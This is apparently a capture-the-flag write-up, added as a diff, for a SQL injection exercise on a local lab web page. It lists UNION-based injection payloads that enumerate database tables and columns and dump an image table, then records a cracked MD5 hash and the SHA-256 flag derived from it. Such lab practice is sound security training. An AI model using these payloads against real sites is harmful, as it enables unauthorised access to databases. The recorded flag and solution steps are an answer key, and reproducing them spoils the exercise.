@@ -1,0 +1,25 @@
+page : http://192.168.120.128/index.php?page=member
+
+# Get tables name in the DB
+0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+
+# find table columns in the DB for each table
+0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS
+
+# Table structure :
+
+Table name: list_images
+column : id
+
+Table name: list_images
+column : url
+
+Table name: list_images
+column : title
+
+Table name: list_images
+column : comment
+
+0 OR 1 = 2 UNION SELECT title, comment FROM Member_images.list_images
+
+# decrypt MD5 hash -> albatroz -> encrypt using sha256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
